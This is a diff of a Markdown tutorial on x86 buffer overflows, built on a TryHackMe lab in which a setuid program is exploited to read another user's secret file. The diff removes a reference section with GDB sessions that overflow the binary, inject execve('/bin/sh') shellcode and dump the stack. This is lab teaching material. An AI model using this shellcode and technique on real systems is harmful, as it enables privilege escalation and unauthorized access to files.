@@ -1,5 +1,5 @@
 ---
-title: "Buffer Overflows"
+title: "x86 Buffer Overflows"
 ---
 
 :::note
@@ -76,7 +76,7 @@ Segfault's happen when our program tries to overwrite memory space it does NOT o
 
 The scenario, is a buffer-overflow program belonging to `user1` will be used to read a `secret.txt` file belonging to `user2`:
 
-```
+```sh
 [user1@ip-10-10-79-28 overflow-3]$ ll
 total 24
 -rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
@@ -109,7 +109,7 @@ this technique uses Python, GDB and a clear understanding of all elements of the
 
 ### Find the offset
 
-::: info
+:::info
 
 The offset is the amount of bytes between filling up the buffer and the start of the return address.
 
@@ -457,85 +457,3 @@ sh-4.2$ cat secret.txt
 omgyoudidthissocool!!
 ```
 
-## Reference
-
-:::note 
-
-this is from the machine on the TryHackMe Room Buffer Overflow.
-
-:::
-
-```
-(gdb) run $(python -c "print('A'*158)")
-Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A'*158)")
-Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
-Here's a program that echo's out your input
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-
-Program received signal SIGSEGV, Segmentation fault.
-0x0000414141414141 in ?? ()
-(gdb) x/100x $rsp-200
-0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff
-0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff
-0x7fffffffe248: 0xffffe64c      0x00007fff      0x41414141      0x41414141
-0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe288: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe298: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe2a8: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe2b8: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe2c8: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe2d8: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe2e8: 0x41414141      0x00004141      0xffffe3e8      0x00007fff
-0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000
-0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
-0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002
-0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000
-0x7fffffffe338: 0x21a0b30a      0x4ea94909      0x00400450      0x00000000
-0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000
-0x7fffffffe358: 0x00000000      0x00000000      0xecc0b30a      0xb156b676
-0x7fffffffe368: 0x7524b30a      0xb156a6c1      0x00000000      0x00000000
-0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000
-0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff
-0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000
-0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000
-
-(gdb) run $(python -c "print 'A'*100 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + 'B'*12 + 'C'*6")
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print 'A'*100 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + 'B'*12 + 'C'*6")
-Here's a program that echo's out your input
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH�/bin/shH�H�QH�<$H1Ұ;BBBBBBBBBBBBCCCCCC
-
-Program received signal SIGSEGV, Segmentation fault.
-0x0000000000400595 in main ()
-(gdb) x/100x $rsp-200
-0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff
-0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff
-0x7fffffffe248: 0xffffe656      0x00007fff      0x41414141      0x41414141
-0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe288: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe298: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7fffffffe2a8: 0x41414141      0x41414141      0x41414141      0x622fb948
-0x7fffffffe2b8: 0x732f6e69      0xc1481168      0xc14808e1      0x485108e9
-0x7fffffffe2c8: 0x48243c8d      0x3bb0d231      0x4242050f      0x42424242
-0x7fffffffe2d8: 0x42424242      0x43434242      0x43434343      0x00007f00
-0x7fffffffe2e8: 0x00400590      0x00000000      0xffffe3e8      0x00007fff
-0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000
-0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
-0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002
-0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000
-0x7fffffffe338: 0x14cb65ee      0xa528a1f1      0x00400450      0x00000000
-0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000
-0x7fffffffe358: 0x00000000      0x00000000      0xd9ab65ee      0x5ad75e8e
-0x7fffffffe368: 0x404f65ee      0x5ad74e39      0x00000000      0x00000000
-0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000
-0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff
-0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000
-0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000
-(gdb) 
-
-```
